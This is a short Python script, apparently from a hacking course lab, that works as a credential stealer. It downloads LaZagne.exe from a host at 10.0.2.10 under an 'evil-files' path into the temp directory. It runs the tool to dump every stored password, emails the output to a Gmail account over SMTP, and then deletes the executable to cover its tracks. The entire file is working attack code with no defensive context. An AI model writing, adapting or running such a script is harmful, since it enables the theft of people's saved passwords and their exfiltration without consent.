#!/usr/bin/env python

import subprocess
import smtplib
import tempfile
import requests
import os


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_derectory = tempfile.gettempdir()
os.chdir(temp_derectory)

download("http://10.0.2.10/evil-files/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail(b"...@gmail.com", b"pass", result)
os.remove("laZagne.exe")
